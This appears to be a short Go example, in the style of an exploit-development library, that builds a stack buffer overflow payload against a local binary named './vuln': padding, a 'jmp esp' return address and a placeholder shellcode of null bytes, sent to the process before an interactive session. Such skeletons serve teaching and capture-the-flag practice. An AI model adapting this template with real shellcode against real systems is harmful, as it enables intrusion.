
```go
	offset := Pad("A", 16)
	payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00} //shellcode
	jmpEsp := p64(0xf7423322)

	fPayload := merge(offset, jmpEsp, payload)

	p := Process("./vuln")
	p.Sendline(fPayload)
	p.interactive()
```